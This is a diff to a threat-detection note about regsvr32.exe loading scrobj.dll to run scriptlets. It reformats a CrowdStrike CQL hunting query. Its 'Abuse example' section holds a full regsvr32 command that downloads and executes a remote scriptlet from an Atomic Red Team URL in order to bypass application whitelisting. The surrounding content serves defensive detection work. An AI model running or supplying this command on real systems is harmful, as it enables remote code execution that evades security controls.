@@ -11,7 +11,8 @@ Looking for regsvr32.exe invoking scrobj.dll with the -i: (scriptlet execution) 
 This behavior strongly implies adversary-driven script execution, striving to evade application whitelisting and antivirus controls, therefore demanding immediate investigation.
 
 Abuse example:
-# Execute code from remote scriptlet, bypass Application whitelisting
+Execute code from remote scriptlet, bypass Application whitelisting
+
 regsvr32 /s /n /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll
 
 #### Platform
@@ -31,6 +32,8 @@ regsvr32 /s /n /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-te
 ## CrowdStrike (CQL)
 
 ```cql
-event_platform = Win #event_simpleName=/ProcessRollup2|ProcessBlocked/i  FileName="regsvr32.exe" | #repo.cid != 77bb5e6ffad446f491aad89de6fa8d38| format("[Tree](https://falcon.us-2.crowdstrike.com/graphs/process-explorer/tree?id=pid:%s:%s&investigate=true&_cid=%s )", field=["aid","TargetProcessId","cid"], as="Tree")| CommandLine = /scrobj\.dll/ CommandLine = /i\:/i| groupBy([@timestamp, ComputerName, UserName, Tree, ParentBaseFileName, FileName, CommandLine])
+event_platform = Win #event_simpleName=/ProcessRollup2|ProcessBlocked/i
+| FileName="regsvr32.exe"
+| format("[Tree](https://falcon.us-2.crowdstrike.com/graphs/process-explorer/tree?id=pid:%s:%s&investigate=true&_cid=%s )", field=["aid","TargetProcessId","cid"], as="Tree")| CommandLine = /scrobj\.dll/ CommandLine = /i\:/i| groupBy([@timestamp, ComputerName, UserName, Tree, ParentBaseFileName, FileName, CommandLine])
 ```
 ---
